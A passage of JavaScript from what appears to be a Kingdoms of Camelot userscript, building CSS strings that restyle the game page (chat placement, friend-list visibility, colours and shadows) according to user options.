	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav { float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_nav {float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_list { float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;} ';}
	// OLD KOC STYLE show/hide KoC Stuff
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;}';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;} ';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.hideShowKoCBottomStuff==true) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;}';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==true) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; }';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==false && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==false && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } ';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==false && Options.hideKoCBar==false && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav { float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_nav {float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_list { float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;}';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_list {display: none;}';}
	if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true && Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.hideShowKoCBottomStuff==false) {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;}';}
	if (Options.hideShowKoCBottomStuff==false) { var hideKoCBottomStuff = ''; }
	if (Options.hideShowKoCBottomStuff==true) { var hideKoCBottomStuff = '\
	.kocmain .panel_friendlist .panel_nav {display: none;  float: left; height: 100px;    position: relative;    width: 36px;}\
	.kocmain .panel_friendlist .panel_list {display: none;  float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;}\
	.kocmain .mod_directory { display: none;}\
	.kocmain .mod_cityinfo {  display: none;}\
	.kocmain { height: 470px;}\
	.kocmain .panel_friendlist { left: 307px; position: absolute;  top: -60px; width: 760px;}\
	.kocmain .kocmain_bottom {background: none repeat scroll 0 0 transparent; height: 0px; left: 0; position: absolute;  top: 464px; width: 760px; z-index: 0;}';
	}
	if (Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground" && Options.pbChatOnRight==false) { var pdxStyleSelBoxShadow = '#141516';	}
	if (Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackgroundColordark" && Options.pbChatOnRight==false) { var pdxStyleSelBoxShadow = '#FFF';}
	if (Options.pdxBackgroundStyle=="pdxBackground11" && Options.pbChatOnRight==false) { var pdxStyleSelBoxShadow = '#FFF';	}


// KOC SCRIPTS STYLE + Chat on right
if (Options.pdxBackgroundStyle=="pdxBackground11" && Options.pbChatOnRight) { // Background Color is Dark -moz-border-radius:2px; border: 1px solid #FFF; -moz-box-shadow: 0 0 1px 2px #FFF;
	var styles = '\
	.kocmain .mod_cityinfo .cityinfo_body { height: 335px; padding-top: 18px; width: 195px;}\
	.kocHeader .domainRow a { color: #FFF; overflow: visible;  white-space: nowrap;}\
	.kocHeader .domainRow a:hover { color: #FF0000; overflow: visible;  white-space: nowrap;}\
	.kocHeader .leftColumn .gemCount {color: green; font-weight: bold;  height: 18px; line-height: 18px; margin: 0 0 5px 25px; overflow: hidden;  padding: 5px; text-align: center;    width: 114px;}\
	.kocHeader {  background: none repeat scroll 0 0 transparent;  height: 98px;  width: 760px; color: #FFF;}\
	.kocHeader .taskbar {  background: none;  height: 100%;  padding-top: 2px;}\
	.kocmain .mod_directory { height: 390px; left: 1px; position: absolute; top: 0; width: 200px;}\
	.kocmain .mod_directory #directory_tabs_2 .directory_upsell {color: #FFFFFF;  margin-left: 10px;}\
	.kocmain .mod_directory #directory_tabs_2 .directory_upsell a { color:#FFF;}\
	.kocmain .mod_directory #directory_tabs_2 .directory_upsell a:hover { color:#FF0000;}\
	.kocmain .mod_directory .directory_body .directory_subbody a { color:#FFF;}\
	.kocmain .mod_directory .directory_body .directory_subbody a:hover { color:#FF0000;}\
	.kocmain .mod_directory .directory_body .directory_subbody { color:#FFF; height: 260px;  margin-left: 10px; margin-top: 1px;  overflow-x: hidden;  overflow-y: scroll;  position: relative;   width: 186px;}\
	.kocmain .mod_directory #directory_tabs_2_members .leaders a { color:#FFF;}\
	.kocmain .mod_directory #directory_tabs_2_members .leaders a:hover { color:#FF0000; }\
	.kocmain .mod_directory #directory_tabs_2_members .leaders { color:#FFF; font-size: 14px;  font-weight: bold; margin-bottom: 5px;  text-align: center;}\
	.kocmain .mod_cityinfo #cityinfo_3 .unitcontainer, .kocmain .mod_cityinfo #cityinfo_4 .unitcontainer { -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; margin-left: 5px;}\
	.kocmain .mod_cityinfo #cityinfo_3 .unitcontainer td, .kocmain .mod_cityinfo #cityinfo_4 .unitcontainer td {-moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; padding: 3px 0;  width: 93px;  background-color: transparent; }\
	.kocmain .mod_cityinfo #cityinfo_2 table tbody td { background-color:transparent; font-weight: bold; padding: 5px 0; background: transparent;}\
	.kocmain .mod_cityinfo #cityinfo_2 table tbody tr td { padding: 5px 0; background: transparent;}\
	.kocmain .mod_cityinfo #cityinfo_1 table tbody td { background-color: none; border-bottom: 1px solid #E5DDC9;}\
	.kocmain .mod_cityinfo #cityinfo_1 table tbody tr td { background-color: transparent; border-bottom: 1px solid #E5DDC9;}\
	.kocmain .mod_cityinfo #cityinfo_1 table .grw {  padding-right: 5px; text-align: right; width: 60px;  background: none;}\
	.kocmain .mod_cityinfo #cityinfo_2 {height: 295px; overflow: auto; width:  210px; }\
	.kocmain .mod_cityinfo #cityinfo_1 .upsell {-moz-border-radius:2px; border: 1px solid #FFF; -moz-box-shadow: 0 0 1px 2px #141516; background-color: transparent; display: block; margin-left: 5px; padding: 5px 0; width: 190px;  color: #FFF !important;}\
	.kocmain .mod_cityinfo #cityinfo_1.cityinfo_body table { border:10px; }\
	#tournament_tab .datefoot { color: #FFF; font-size: 10px;  margin: 10px 0; }\
	.directory_body #tournament_tab .leaderrow {-moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF;}\
	#tournament_tab .leaderboardheader { color: #FFF; font-size: 14px; font-weight: bold;  padding-bottom: 10px; text-align: center;}\
	.kocmain .mod_directory {    height: 390px;    left: 1px;    position: absolute;    top: 0px;    width: 200px;    z-index: 1;}\
	.kocmain .mod_cityinfo {  color: #FFF;  left: 530px; overflow-x: hidden; position: absolute; top: -3px; width: 235px;}\
	.kocmain .kocmain_bottom { background: none; height: 390px; left: 0; position: absolute; top: 464px; width: 760px; z-index: 1 !important;}\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist a { color:'+Colors.ChatLinkColGlobal+' }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist a { color:'+Colors.ChatLinkColAlly+' }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist .chatwrap .content .info b { color:'+Colors.SayToAlliCol+' !important; }\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist .chatwrap .content .info b { color:'+Colors.SayToGlobalCol+' !important; }\
	.mod_comm_forum  a { font-variant:small-caps;  color:'+Colors.modCommForumA+';}\
	.mod_comm_forum a:hover { font-weight: bold; font-variant:small-caps; color:'+Colors.modCommForumAhover+'; text-decoration:none; text-shadow: 1px 1px 6px '+Colors.modCommForumAhover+';}\
	.kocmain .mod_comm .comm_global .chatlist .direct { -moz-border-radius:3px; background-color: #FF0000; -moz-box-shadow: 0 0 3px 2px #FF0000; padding:8px;  margin-Bottom:3px;}\
	.kocmain .mod_comm .comm_global .chatlist .noalliance { color:#141516;   margin-top: 5px; -moz-box-shadow: 0 0 1px 1px #CCC;  -moz-border-radius:2px;}\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content { -moz-box-shadow: 0 0 1px 1px #FFF; padding:1.5px; -moz-border-radius:2px; border:1px inset #FF0000; color: '+Colors.ChatFontColor+'; float: left; position: relative; width: '+ (Options.chatWidth-60) +'px;  }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content:hover { -moz-box-shadow: 0 0 2px 3px #CCC; padding:1.5px; -moz-border-radius:2px; border:1px inset #FF0000; color:#FF0000; float: left; position: relative; width: '+ (Options.chatWidth-60) +'px; }\
	.kocmain .mod_comm .comm_global .postaction .button20 {border: 1px inset '+Colors.MainTitle+'; display: block; line-height: 30px;  -moz-border-radius:6px; border:0px solid #141516; -moz-box-shadow: 0 0 2px 3px #FFF;}\
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input {padding:10px;  -moz-border-radius:3px; border:0px inset #141516; -moz-box-shadow: 0 0 1px 3px #FFF; } \
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input:hover {  border:0px inset #FF0000; -moz-box-shadow: 0 0 1px 1px #222; }';
	var friendListBackground = 'background: none;';
	var pdxStyleSelTop = '-1285px';
	var pdxStyleSelBoxShadow = '#FFF';
	var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#FFF';
    var pdxlinkColorHover = 'color: #FF0000;';
	var pdxhelpButtonRight = '25px';
	var pdxpostAction = 'left: 30px; top:-55px; padding: 10px 10px; position: relative;  width: 340px;';
	var pdxModCommTop = 'top: 20px;';
	var pdxChatContentColor = '#FFF';
	var modChatlistBoarder = '3px 3px 3px 3px ';
	var modChatlistBoxShadow ='-moz-box-shadow: 0 0 2px 2px '+pdxStyleSelBoxShadow+';';
}
// ONLY IF BACKGROUND WALLPAPER AND COLOR (DARK) || COSTUM SETTINGS DARK + Chat on right
if (Options.pbChatOnRight && Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackgroundColordark") { // Background Color is Dark
var styles = '';
	var friendListTop = '915px';
	var friendListBackground = 'background: none;';
	var pdxStyleSelTop = '-1285px';
    var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#FFF';
    var pdxlinkColorHover = 'color: #FF0000;';
	var pdxStyleSelBoxShadow = '#FFF;';
	var pdxhelpButtonRight = '25px';
	var pdxpostAction = 'left: 30px; top:-55px; padding: 10px 10px; position: relative;  width: 340px;';
	}
// ONLY IF OWN BACKGROUND WALLPAPER AND COLOR (LIGHT) || COSTUM SETTINGS LIGHT + Chat on right
if (Options.pbChatOnRight && Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground") { // Background Color is Light
	var styles = '';
	var friendListTop = '915px';
	var friendListBackground = 'background: none;';
	var pdxStyleSelTop = '-1285px';
	var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#FFF';
	var pdxlinkColorHover = 'color: #FF0000;';
	var pdxStyleSelBoxShadow = '#141516';
	var pdxhelpButtonRight = '25px';
	var pdxpostAction = 'left: 30px; top:-55px; padding: 10px 10px; position: relative;  width: 340px;';
	}
// DESIGN FOR ALL OTHER STYLES + Chat on right
if (Options.pbChatOnRight && Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" || Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" || Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" || Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
var styles = '';
	var friendListTop = '915px';
	var friendListBackground = 'background: none;';
	var pdxStyleSelTop = '-1285px';
	var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#FFF';
	var pdxlinkColorHover = 'color: #FF0000;';
	var pdxStyleSelBoxShadow = '#141516';
	var pdxhelpButtonRight = '25px';
	var pdxpostAction = 'left: 30px; top:-45px; padding: 10px 10px; position: relative;  width: 340px;';
	}//	.kocmain .mod_comm .comm_global .chatlist .global { background-color: #141516; -moz-border-radius:2px;}\

// FOR ALL STYLE IF CHAT ON THE RIGHT
if (Options.pbChatOnRight) { // Background Color is Dark -moz-border-radius:2px; border: 1px solid #FFF; -moz-box-shadow: 0 0 1px 2px #FFF;
	var styles = '\
		.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .message { width: '+ (Options.chatWidth-70) +'px;}\
	.kocmain .mod_cityinfo #cityinfo_3 .unitcontainer, .kocmain .mod_cityinfo #cityinfo_4 .unitcontainer { -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; margin-left: 5px;}\
	.kocmain .mod_cityinfo #cityinfo_3 .unitcontainer td, .kocmain .mod_cityinfo #cityinfo_4 .unitcontainer td { -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF;  -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; padding: 3px 0;  width: 93px;  background-color: transparent; }\
	.kocmain .mod_cityinfo #cityinfo_2 table tbody td { background-color:transparent; font-weight: bold; padding: 5px 0; background: transparent;}\
	.kocmain .mod_cityinfo #cityinfo_2 table tbody tr td { padding: 5px 0; background: transparent;}\
	.kocmain .mod_cityinfo #cityinfo_1 table tbody td { background-color: none; border-bottom: 1px solid #E5DDC9;}\
	.kocmain .mod_cityinfo #cityinfo_1 table tbody tr td { background-color: transparent; border-bottom: 1px solid #E5DDC9;}\
	.kocmain .mod_cityinfo #cityinfo_1 table .grw {  padding-right: 5px; text-align: right; width: 60px;  background: none;}\
	.kocmain .mod_cityinfo #cityinfo_2 {height: 295px; overflow: auto; width:  210px; }\
	.kocmain .mod_cityinfo #cityinfo_1 .upsell {-moz-border-radius:2px; border: 1px solid #FFF; -moz-box-shadow: 0 0 1px 2px #141516; background-color: transparent; display: block; margin-left: 5px; padding: 5px 0; width: 190px;  color: #FFF !important;}\
	.kocmain .mod_cityinfo #cityinfo_1.cityinfo_body table { border:10px; }\
	#tournament_tab .datefoot { color: #FFF; font-size: 10px;  margin: 10px 0; }\
	.directory_body #tournament_tab .leaderrow {-moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF;}\
	#tournament_tab .leaderboardheader { color: #FFF; font-size: 14px; font-weight: bold;  padding-bottom: 10px; text-align: center;}\
	.kocmain .mod_directory {    height: 390px;    left: 1px;    position: absolute;    top: 0px;    width: 200px;    z-index: 1;}\
	.kocmain .mod_cityinfo {  color: #FFF;  left: 530px; height:450px; overflow: hidden; position: absolute; top: -3px; width: 235px;}\
	.kocmain .kocmain_bottom { background: none; height: 390px; left: 0; position: absolute; top: 464px; width: 760px; z-index: 1 !important;}\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist a { color:'+Colors.ChatLinkColGlobal+' }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist a { color:'+Colors.ChatLinkColAlly+' }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist .chatwrap .content .info b { color:'+Colors.SayToAlliCol+' !important; }\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist .chatwrap .content .info b { color:'+Colors.SayToGlobalCol+' !important; }\
	.mod_comm_forum  a { font-variant:small-caps;}\
	.mod_comm_forum a:hover { font-weight: bold; font-variant:small-caps; color:'+Colors.modCommForumAhover+'; text-decoration:none; text-shadow: 1px 1px 6px '+Colors.modCommForumAhover+';}\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content { color:#FFF; }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist .chatwrap .content .global{ color: #141516;}\
	.kocmain .mod_comm .comm_global .chatlist .direct { -moz-border-radius:3px; background-color: #FF0000; -moz-box-shadow: 0 0 3px 2px #FF0000; padding:8px;  margin-Bottom:3px;}\
	.kocmain .mod_comm .comm_global .chatlist .noalliance { color:#141516;   margin-top: 5px; -moz-box-shadow: 0 0 1px 1px #CCC;  -moz-border-radius:2px;}\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content { -moz-box-shadow: 0 0 1px 1px #FFF; padding:1.5px; -moz-border-radius:2px; border:1px inset #FF0000; color:#FFF; float: left; position: relative; width: '+ (Options.chatWidth-60) +'px; }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content:hover { -moz-box-shadow: 0 0 2px 3px #CCC; padding:1.5px; -moz-border-radius:2px; border:1px inset #FF0000; color:#FF0000; float: left; position: relative; width: '+ (Options.chatWidth-60) +'px; }\
	.kocmain .mod_comm .seltab1 a.tab1, .kocmain .mod_comm .seltab2 a.tab2 {color: red; background-image:url('+Options.OwnBackGroundAlliance+'); cursor: pointer; display: block; float: left; height: 30px; text-decoration: none; -webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;border-top-left-radius: 8px;border-top-right-radius: 8px; -moz-box-shadow: 0 0 3px 3px #FFFFFF;}\
	.kocmain .mod_comm .seltab1 a.tab1 span, .kocmain .mod_comm .seltab2 a.tab2 span { background-image:url('+Options.OwnBackGroundAlliance+'); cursor: pointer; color: #FF0000; display: block; font-size: 12px; font-weight: bold; height: 30px; line-height: 35px; -webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;border-top-left-radius: 8px;border-top-right-radius: 8px; }\
	.kocmain .mod_comm .comm_global .postaction .button20 {border: 1px inset '+Colors.MainTitle+'; display: block; line-height: 30px; -moz-border-radius:6px; border:0px solid #141516; -moz-box-shadow: 0 0 2px 3px #FFF;}\
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input {padding:10px;  -moz-border-radius:3px; border:0px inset #141516; -moz-box-shadow: 0 0 1px 3px #FFF; } \
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input:hover { border:0px inset #141516; -moz-box-shadow: 0 0 1px 1px #FFF; } \
	.kocmain .mod_comm .comm_tabs a { transition-duration: 0.1s; -moz-transition-duration: 0.1s; -webkit-transition-duration: 0.1s; -o-transition-duration: 0.1s; }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info .time { color:#FFF; }\
		.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info .time:hover { color:#FF0000; }\
	';
	var pdxhelpButtonRight = '25px';
	var merlinsBoxLeft = '-554px';
	var merlinsBoxTop = '555px';
	var pdxpostAction = 'left: 30px; top:-45px; padding: 10px 10px; position: relative;  width: 340px;';
	var pdxModCommTop = 'top: 10px;';
	var modComTabsTop = ' top:-40px;';
	var pdxChatTabsFColor = 'color: #FFF;';
	var pdxModComForumLinkColor = '#FFF';
	var pdxChatContentColor = '#FFF';
	var pdxChatContentWidth = 'width: '+ (Options.chatWidth-70) +'px';
}
// OLD KOC STYLE
if (Options.pbChatOnRight==false) {
	var styles = '\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist { -moz-border-radius: 3px;  color:#FFFFFF; height: 305px !important; overflow:auto; }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist { -moz-border-radius: 3px;  color:#FFFFFF; height: 305px !important; overflow:auto; }\
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input {width: 265px; margin-top: 3px;}\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info a {color:#FFF !important}\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info {  width: 280px; color:'+pdxChatContentColor+';  }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .message { width: 280px;}\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist a { color:#141516 !important}\
	.kocmain .mod_comm .seltab1 a.tab2, .kocmain .mod_comm .seltab2 a.tab1 { font-variant:small-caps;  color: #FFF; }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist a { color:#141516 !important}';
var modChatlistBoarder = '3px 3px 3px 3px';
	var pdxStyleSelBoxShadow = '#141516';
	var pdxlinkColor = '#141516';
	var pdxlinkColorHover = 'color: #FF0000;';
	var pdxStyleSelTop = '-355px';
	var pdxInfoBoxTop = '-1000px';
	var pdxChatTabsFColor = 'color: #FFF;';
	var pdxChatContentColor = '#FFF';
var pdxChatContentWidth = 'width: 280px';
}
// + CHAT RIGHT
if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight) { // Background Color is Dark
	var styles = '.kocmain .mod_comm .seltab1 a.tab2, .kocmain .mod_comm .seltab2 a.tab1 { font-variant:small-caps;  color: #141516; }\
	.kocmain .mod_comm .seltab1 a.tab1, .kocmain .mod_comm .seltab2 a.tab2 { background-image:url('+Options.OwnBackGroundAlliance+'); height: 30px; text-decoration: none; -webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;border-top-left-radius: 8px;border-top-right-radius: 8px; -moz-box-shadow: 0 0 3px 3px #141516;}\
	.kocmain .mod_comm .seltab1 a.tab1 span, .kocmain .mod_comm .seltab2 a.tab2 span { background-image:url('+Options.OwnBackGroundAlliance+'); -webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;border-top-left-radius: 8px;border-top-right-radius: 8px; }\
	.kocmain .mod_comm .seltab1 a.tab1 span, .kocmain .mod_comm .seltab2 a.tab2 span {color: red;  }';
	var pdxStyleSelTop = '-1285px';
	var pdxStyleSelBoxShadow = '#141516';
	var merlinsBoxLeft = '-554px';
    var merlinsBoxTop = '555px';
	var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#141516';
	var pdxlinkColorHover = 'color: #222222;';
	var pdxhelpButtonRight = '25px';
	var pdxModCommTop = 'top: 10px;';
	var modComTabsTop = ' top:-40px;';
	var modcommListsWidth = 'width: 360px;';
	var pdxChatTabsFColor = 'color: #141516;';
	var pdxModComForumLinkColor = '#141516';
	var pdxChatContentColor = '#141516';
var modChatlistBoarder = '3px 3px 3px 3px';
var modChatlistBoxShadow ='';
var pdxChatContentWidth = 'width: '+ (Options.chatWidth-70) +'px';
	}

	// MAIN KOC POWER - STYLE
var kocPowerMainStyle = '\
	'+showMightKoCBugFix+'\
	'+showResKoCBugFix+'\
		#mod_comm_list1 { overflow:auto;  border-radius:'+modChatlistBoarder+'; '+modChatlistBoxShadow+' '+modcommListsWidth+'} \
	#mod_comm_list2 {overflow:auto;  border-radius:'+modChatlistBoarder+'; '+modChatlistBoxShadow+' '+modcommListsWidth+' } \
		.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info {color:'+pdxChatContentColor+'; '+pdxChatContentWidth+';  }\
		.kocmain .mod_comm .seltab1 a.tab2, .kocmain .mod_comm .seltab2 a.tab1 { font-variant:small-caps;  '+pdxChatTabsFColor+' }\
		.mod_comm_forum  a { font-variant:small-caps;  color:'+pdxModComForumLinkColor+';}\
	.mod_comm_forum a:hover { font-weight: bold; font-variant:small-caps; text-decoration:none; text-shadow: 1px 1px 6px '+Colors.modCommForumAhover+';}\
	.kocmain .mod_comm .comm_global .chatlist .global {    background-color: transparent;}\
		.kocmain .mod_comm .comm_global .chatlist .chatwrap {  border-radius: 3px 3px 3px 3px;    box-shadow: 0 0 3px 1px #FFFFFF;    display: block;    padding: 5px;    position: relative;    margin-top: 7px;} }\
	#mainbody div#kocmain.kocmain div#kocmain_bottom.kocmain_bottom div.mod_comm div#comm_tabs.comm_tabs a:hover {text-decoration: none; text-shadow: 1px 1px 4px #FF0000;}\
	.kocmain .mod_comm .comm_body { '+pdxModCommTop+' }\
	.kocmain .mod_comm .comm_tabs { '+modComTabsTop+' }\
	.kocHeader .timeAndDomain a.helpButton {  margin-right: '+pdxhelpButtonRight+';}\
	.info nm a {  font-family:verdana, sans-serif; color:'+pdxlinkColor+';}\
	.info nm a:hover { font-family:verdana, sans-serif;  '+pdxlinkColorHover+' text-decoration:none; text-shadow: 3px 3px 15px #FF0000;}\
	.kocmain .panel_friendlist { '+friendListBackground+' left: 0; position: absolute; top: '+friendListTop+'; width: 760px;}\
	.pdxQuickInfoData { color:'+Colors.pdxQuickInfoData+'; font-weight: bold; }\
	.pdxVersions { padding: 2px 5px; -moz-border-radius: 3px; -moz-box-shadow: 0 0 2px 1px #FFF; }\
	.ptChatIcon {border: 2px inset red; -moz-border-radius:3px; -moz-box-shadow: 0 0 1px 1px #FFF;}\
